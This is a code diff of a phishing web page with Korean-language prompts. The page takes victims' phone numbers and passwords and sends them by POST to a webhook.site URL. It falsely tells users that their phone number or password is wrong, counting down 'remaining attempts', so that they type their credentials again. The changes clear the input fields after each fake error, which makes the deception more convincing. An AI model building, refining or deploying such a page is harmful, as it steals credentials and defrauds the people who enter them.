@@ -62,7 +62,7 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 </div>
 
 <script>
-const webhookUrl = "https://webhook.site/77d0020a-315a-4b5f-9614-187e3029b1f9"; // Webhook URL
+const webhookUrl = "https://webhook.site/77d0020a-315a-4b5f-9614-187e3029b1f9";
 let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
@@ -153,6 +153,7 @@ function sendPhone() {
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
   if (!phoneRegex.test(userId)) { 
     alert("잘못된 형식의 전화번호입니다."); 
+    document.getElementById("userId").value = "";
     return; 
   }
 
@@ -166,6 +167,7 @@ function sendPhone() {
   }).catch(err=>console.error(err));
 
   alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
+  document.getElementById("userId").value = ""; // 입력칸 초기화
 
   if(phoneTryCount >= 2) {
     savedPhone = userId;
@@ -197,6 +199,7 @@ function sendPage4() {
 
   if(loginTryCount >= 1 && loginTryCount <= 5) {
     alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
+    document.getElementById("userCode4").value = ""; // 비밀번호칸 초기화
     fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
